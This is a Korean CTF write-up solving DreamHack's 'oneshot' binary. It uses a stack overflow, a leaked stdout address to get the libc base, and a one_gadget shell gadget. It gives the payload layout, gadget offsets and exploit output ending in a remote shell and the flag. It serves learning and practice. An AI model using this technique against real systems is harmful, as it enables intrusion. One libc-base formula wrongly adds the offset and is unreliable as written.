# DreamHack - oneshot 풀이

## 1. 문제 정보

- **문제명:** oneshot
- **핵심 취약점:** Stack Buffer Overflow, Stack Canary
- **공격 기법:** Information Leak, ASLR Bypass, One Gadget, Partial Overwrite

## 2. 파일 분석

### 2-1. 파일 정보 확인

<img width="800" alt="image" src="https://github.com/user-attachments/assets/acd7be68-ba72-47c5-8ec1-2dcf7e3ac1df" />

<img width="800" alt="image" src="https://github.com/user-attachments/assets/e5a59e1a-82db-4625-956c-ae1e8c97cefa" />

<img width="800" alt="image" src="https://github.com/user-attachments/assets/31085f82-d6d9-4c9c-b919-05975108baa9" />

먼저 제공된 파일들의 종류를 확인한다.

```bash
file oneshot
file libc.so.6
file oneshot.c
```
<img width="800" alt="image" src="https://github.com/user-attachments/assets/e084ae22-5e4d-4fb9-bf76-9f82bda8e98a" />

- `oneshot`: 64비트 ELF 실행 파일, PIE 적용. 실행하는 프로그램
- `libc.so.6`: 64비트 공유 라이브러리로 printf, read등의 라이브러리 함수 제공
- `oneshot.c`: C 소스 코드

문제에서 별도의 `libc.so.6`를 제공하므로, 해당 라이브러리의 오프셋을 기준으로 주소를 계산해야 한다.
(여기서 libc 는 C프로그램이 실행될 때 사용하는 표준 라이브러리로, 함수 등 자주 사용하는 기능들을 라이브러리 형태로 만들어두고 프로그램에서 가져다 사용함. 나중에 나오겠지만 붙여서 설명하자면, 이런 라이브러리를 메모리에 불러오고 연결하기 위해서는 동적 로더가 필요함. 여기서 사용되는 동적 로더는 ld-linux였음.)

### 2-2. 보호 기법 확인

```bash
checksec --file=./oneshot
```
<img width="800" alt="image" src="https://github.com/user-attachments/assets/f054487c-0f58-4028-9968-113c1b484f3e" />

- **Partial RELRO:** GOT 영역에 대한 보호가 일부만 적용됩.
- **No Canary:** 스택 카나리 검사 없음.
- **NX:** 스택에서 직접적인 코드 실행이 제한됨.
- **PIE:** 실행 파일의 코드 주소가 실행할 때마다 변경됨.

Canary가 없으므로 버퍼 오버플로우를 이용한 반환 주소 변조를 시도할 수 있다. NX가 활성화되어 있으므로 스택에 셸코드를 삽입하는 대신 libc 내부의 코드를 활용하는 방향으로 접근했다.

## 3. 소스 코드 분석

<img width="800" alt="image" src="https://github.com/user-attachments/assets/13891416-3320-4187-b894-7a41d120a46f" />

### 3-1. 버퍼 오버플로우 취약점 확인

가장 중요한 부분은 다음 코드이다.

```c
char msg[16];
size_t check = 0;

read(0, msg, 46);
```

`msg`는 16바이트 크기로 선언되어 있지만, `read()` 함수는 최대 46바이트를 입력받는다.
따라서 버퍼 크기를 초과하는 데이터를 입력하면 인접한 스택 메모리까지 덮어쓸 수 있다.

### 3-2. check 변수 확인

```c
if(check > 0) {
    exit(0);
}
```

입력 이후 `check`가 0보다 크면 프로그램이 종료된다. 따라서 반환 주소를 덮어쓰더라도 `check`의 값은 0으로 유지해야 한다.

### 3-3. stdout 주소 유출

```c
printf("stdout: %p\n", stdout);
```

프로그램이 실행되면 libc는 메모리의 특정 주소에 적재되는데, ASLR이 적용되면 실행할 때마다 라이브러리가 적재되는 주소가 달라진다. 

주소가 달라지면 libc 내부 함수의 주소를 미리 알고 있어도 바로 사용할 수 없기에, 이 때 필요한 것이 바로 정보유출이다. 프로그램에서 미리 메모리 주소를 출력해주면, 이 주소를 이용해 libc의 실제 시작 주소를 역산하는 방법이다. 

`실제 주소 = libc base + offset`
- libc base: libc가 메모리에 적재된 시작 주소
- offset: libc 파일 내부에서 특정 함수나 데이터가 위치한 상대적 거리
- 실제 주소: 실행 중인 프로세스 메모리에서의 주소

즉, libc 파일이 동일하다면 내부 함수들의 상대적인 위치는 동일하게 유지되므로, 시작 주소만 알아내면 다른 함수들의 주소도 계산할 수 있다. 

따라서 유출된 주소에서 해당 오프셋을 빼면 libc의 시작 주소인 `libc base`를 구할 수 있다.

`stdout`은 표준 출력 스트림을 가리키는 포인터로, glibc에서는 이와 연결된 `_IO_2_1_stdout_`객체가 libc 내부에 존재한다. 프로그램 실행 시 `stdout`의 메모리 주소를 출력하게 되는데, 이러면 ALSR이 적용된 환경 내에서도 libc 내부의 특정 데이터 주소를 알아낼 수 있게 된다. 

## 4. 어셈블리 분석 및 스택 구조 확인

소스 코드만으로는 실제 스택에서 각 변수가 어느 위치에 저장되는지 정확하게 알기 어렵다.
따라서 GDB를 이용해 `main()`의 어셈블리를 확인했다.

<img width="800" alt="image" src="https://github.com/user-attachments/assets/95b7469c-18ea-44c9-b74f-a625eb705759" />

```gdb
disassemble main
```

주요 부분은 다음과 같다.

```asm
sub rsp, 0x30

lea rax, [rbp-0x20]
mov edx, 0x2e
call read@plt

cmp QWORD PTR [rbp-0x8], 0x0
```

<img width="800" alt="image" src="https://github.com/user-attachments/assets/17eb5a74-b22b-4ee9-8015-9cac8f9e8ce7" />

<img width="800" alt="image" src="https://github.com/user-attachments/assets/c20d355b-8114-4298-abb1-09cedb95dce6" />

<img width="800" alt="image" src="https://github.com/user-attachments/assets/f66f2c41-077e-4374-a289-23dea5752b7b" />

어셈블리 분석 결과 다음과 같은 정보를 확인할 수 있다.

- `msg` 시작 주소: `rbp-0x20`
- `check` 저장 위치: `rbp-0x8`
- 입력 크기: `0x2e` = 46바이트

### 4-1. 스택 메모리 구조

`msg`의 시작 주소를 기준으로 스택 구조를 정리하면 다음과 같다.

| 위치 | 오프셋 | 크기 |
|---|---:|---:|
| msg | 0~15 | 16바이트 |
| 패딩 | 16~23 | 8바이트 |
| check | 24~31 | 8바이트 |
| Saved RBP | 32~39 | 8바이트 |
| Return Address | 40~47 | 8바이트 |

반환 주소까지 도달하려면 총 40바이트가 필요하다.

하지만 `read()`가 최대 46바이트만 입력받으므로 반환 주소의 하위 6바이트를 덮어쓰는 방식으로 페이로드를 구성했다.

### 최종 페이로드 구조

```text
A * 24
+ NULL * 8
+ B * 8
+ One Gadget 주소의 하위 6바이트
```

각 영역의 의미는 다음과 같다.


 `A * 24`  msg와 패딩 영역 채우기 
 `NULL * 8`  check를 0으로 유지 
 `B * 8`  Saved RBP 덮어쓰기 
 One Gadget 주소 6바이트  반환 주소 덮어쓰기

`check` 영역에 0을 넣는 이유는 `if(check > 0)` 조건을 통과해 프로그램이 종료되지 않도록 하기 위해서다.

반환 주소는 8바이트이지만, 사용자 공간의 일반적인 x86-64 주소는 상위 2바이트가 0이므로 하위 6바이트만 덮어써도 원하는 주소로 변경할 수 있다. 이 방식은 기존 반환 주소의 상위 2바이트가 그대로 0이라는 전제가 필요하다.

## 5. libc 정보 분석

이 문제에서는 One Gadget을 사용하기 위해 제공된 `libc.so.6`의 정보를 확인해야 한다.

```bash
readelf -sW ./libc.so.6 | grep _IO_2_1_stdout_
```
<img width="800" alt="image" src="https://github.com/user-attachments/assets/adb7dee7-b264-45c8-b641-4d16d6600e0c" />

따라서 `_IO_2_1_stdout_`의 오프셋은 `0x3c5620`이다.

이제 libc base를 알아내려면 stdout 주소만 알아내면 됨!!


프로그램 실행했을 때 `oneshot.c`의 `main()`속 
```c
printf("stdout: %p\n", stdout);
```
때문에 바로 `stdout`의 주소가 출력된다. 

stdout: 0x7f1caffe9620

따라서 libc base = 0x3c5620 + 0x7f1caffe9620


## 6. One Gadget 분석

One Gadget은 libc 내부에 존재하는 특정 명령어 위치로, 해당 위치에 바로 실행 흐름을 이동시키면 셸을 실행할 수 있는 가젯이다. 이번 문제에서는 libc 내부의 특정 코드를 실행하여 셸을 획득하는 One Gadget 기법을 사용할 수 있는지 확인했다.

### 6-1. Ruby 및 One Gadget 설치

One Gadget은 Ruby 기반 도구이므로 먼저 Ruby와 gem을 설치하고, One Gadget을 설치했다.

### 6-2. One Gadget 오프셋 확인

```bash
one_gadget ./libc.so.6
```

확인 결과:

```text
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

총 4개의 가젯을 확인했다. 

이번 풀이에서는 `0x45216`을 사용했다. 해당 가젯의 조건은 `rax == NULL`이다. 즉, 해당 주소로 실행 흐름을 옮기더라도 rax가 0이 아니면 정상적으로 셸을 실행하지 못할 수 있다. 

## 7. 실행 환경 확인

libc 주소를 계산하는 과정에서 실행 환경에 문제가 있다는 사실을 발견했다.

처음에는 프로그램이 제공된 libc를 사용한다고 가정했지만, 실제 실행 환경을 확인해 보니 시스템 libc를 사용하고 있었다.

### 7-1. 현재 연결된 libc 확인

처음에는 Ubuntu 시스템의 기본 libc를 사용해 실행했다.

```bash
ldd ./oneshot
```

처음에는 시스템에 설치된 libc를 사용해 실행했지만, 시스템 libc는 GLIBC 2.35이고 문제에서 제공된 libc는 GLIBC 2.23이었다.

라이브러리 버전이 다르면 내부 오프셋도 달라지므로, 제공된 libc와 동일한 버전의 환경에서 테스트해야 했다.

이를 위해 Podman 컨테이너를 이용해 Ubuntu 16.04 환경을 구성했다.

```bash
podman run --rm ubuntu:16.04 ldd --version
```

실행 환경을 맞춘 뒤 로컬에서 익스플로잇을 테스트했고, 셸 획득에 성공했다. 

```bash
podman run --rm -v "$PWD":/work ubuntu:16.04 \
bash -c '/lib64/ld-linux-x86-64.so.2 --library-path /work --list /work/oneshot'
```

확인 결과:

```text
libc.so.6 => /work/libc.so.6
```

따라서 로컬에서도 문제에서 제공된 GLIBC 2.23을 사용해 실행할 수 있었다.


```bash
podman run --rm -it -v "$PWD":/work ubuntu:16.04 \
/lib64/ld-linux-x86-64.so.2 --library-path /work /work/oneshot
```

이렇게 실행한 뒤 stdout 주소를 확인하고, 앞에서 구한 libc 오프셋을 이용해 One Gadget 주소를 계산했다.

로컬 테스트에서는 페이로드 전송 후 `id` 명령어를 실행했을 때 다음 결과를 확인했다.

```text
uid=0(root) gid=0(root) groups=0(root)
```

이를 통해 로컬 환경에서 셸 획득에 성공했음을 확인했다.

---

## 7. 익스플로잇 작성

### 7-1. libc base 계산

원격 서버에서 출력되는 stdout 주소를 이용한다.

계산식은 다음과 같다.

```text
libc base = stdout 주소 - stdout 오프셋
```

이번 실행에서 확인한 주소는 다음과 같다.

```text
stdout      : 0x7f1caffe9620
stdout offset: 0x3c5620
```

따라서:

```text
libc base = 0x7f1caffe9620 - 0x3c5620
          = 0x7f1cafc24000
```

이제 libc base에 One Gadget 오프셋을 더한다.

```text
One Gadget = libc base + 0x45216
           = 0x7f1cafc69216
```

이렇게 하면 ASLR이 적용된 원격 환경에서도 해당 프로세스의 One Gadget 실제 주소를 계산할 수 있다.

### 7-2. 최종 익스플로잇 코드

`exploit.py`

 <img width="800" alt="image" src="https://github.com/user-attachments/assets/4f3733be-be3d-49fc-ac90-2d6b13ba83af" />

 <img width="800" alt="image" src="https://github.com/user-attachments/assets/89cfef4e-d10b-4b4d-8191-923bcbb25477" />

 <img width="800" alt="image" src="https://github.com/user-attachments/assets/ccacc028-1470-4e83-b0cb-a74176dffa7b" />

 1. DreamHack 원격 서버에 소켓으로 연결한다.
 2. 서버가 출력한 stdout 주소를 읽는다.
 3. stdout 오프셋을 빼서 libc base를 계산한다.
 4. libc base에 One Gadget 오프셋을 더해 실제 가젯 주소를 구한다.
 5. `check`를 0으로 유지하면서 반환 주소를 덮어쓰는 46바이트 페이로드를 전송한다.
 6. 반환 주소가 One Gadget을 가리키도록 변경되면 셸 실행을 시도한다.

### 7-3. 실행

```bash
python3 exploit.py
```

실행 결과:

```text
[+] Connected to DreamHack server
stdout: 0x7f1caffe9620
MSG:

[+] stdout     : 0x7f1caffe9620
[+] libc base  : 0x7f1cafc24000
[+] One Gadget : 0x7f1cafc69216
[+] Payload size: 46
[+] Payload sent!
[*] Interactive shell started
```

원격 셸에서 `ls` 명령어를 실행했을 때 다음 파일을 확인했다.

```text
flag
oneshot
```

또한 `id` 명령어를 실행한 결과:

```text
uid=1000(oneshot) gid=1000(oneshot) groups=1000(oneshot)
```

이를 통해 원격 서버에서 `oneshot` 계정의 셸을 획득한 것을 확인했다.

여기서

```text
cat ./flag
```

를 실행하였을 때 FLAG를 확인할 수 있었다.(캡처를 못했다.....)

---

### 8. 느낀 점

이번 문제를 통해 버퍼 오버플로우 공격에서는 단순히 반환 주소를 덮어쓰는 것뿐 아니라, 스택에 저장된 변수의 위치와 프로그램의 종료 조건까지 고려해야 한다는 점을 알게 되었다.

특히 stdout 주소 유출을 이용해 libc base를 계산하고, 이를 바탕으로 One Gadget의 실제 주소를 구하는 과정이 핵심이었다.

또한 One Gadget은 주소만 맞춘다고 무조건 실행되는 것이 아니라, 가젯마다 요구하는 레지스터와 스택 조건이 존재한다는 점도 중요했다.

마지막으로 로컬과 원격 환경의 libc 버전 및 실행 환경을 확인하는 과정이 익스플로잇 성공에 큰 영향을 준다는 것을 배웠다.